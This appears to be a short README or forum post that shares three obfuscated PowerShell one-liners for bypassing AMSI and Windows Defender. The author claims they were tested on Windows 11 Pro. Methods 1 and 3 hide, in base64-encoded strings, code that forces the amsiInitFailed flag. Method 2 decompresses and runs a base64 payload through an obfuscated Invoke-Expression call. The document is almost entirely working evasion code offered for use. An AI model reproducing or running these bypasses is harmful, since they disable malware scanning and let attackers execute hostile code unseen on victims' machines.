# Bypass AMSI 2022 

Hello, I share 3 of my scripts that will allow you to evade Windows Defender and AMSI with updated signatures.
Tested Windows 11 Pro.

## Bypass AMSI Method 1:

```sh
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)
```

##  Bypass AMSI Method 2:

```sh
&( $SHELLid[1]+$SHELlId[13]+'X') (NeW-OBJEct sYStEm.iO.coMPrESSIOn.defLAtEstReam( [iO.meMorYStReAm] [cOnvErt]::froMBaSE64StRINg( 'rVHRasJAEHzvdwhGkBAhLUXwYU7i2aKFq4mQBh8Sc6bBM5HkYmq/vruQfkF7L3s7s8vM3CXv+nRw0bb6kpm7K7UN71ftjJwk1F/WDapjnZdVcZjPo6qku+aRnW0Ic5JlXd10Y4lcNfVFpK1+8gduHPXiEestcggD6WFTiDfIAFkhPiGP+FDCQkbce1j6UErMsFbIesYD3rtCPhOPDgHtKfENecZe0TzVDNRjsRhP6LCpValN/g/GYzZGxlMlXiF9rh6CGISToZ6Nn3+Fp3+XCwtxY5kIlF++cC6S2WIDEfJ7xEPeuMeQdaftPjUdfVLVGTMd2abTk4cf'), [sysTEm.iO.cOmpResSioN.COMprEssiOnMOde]::decOMPRESs ) | foreAch{NeW-OBJEct iO.STREaMREadER( $_ , [teXt.ENCoDiNg]::aScii )}).REadtoenD( ) 
```

## Bypass AMSI Method 3:

```sh
${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
${1}.SetValue($null,$true)
```
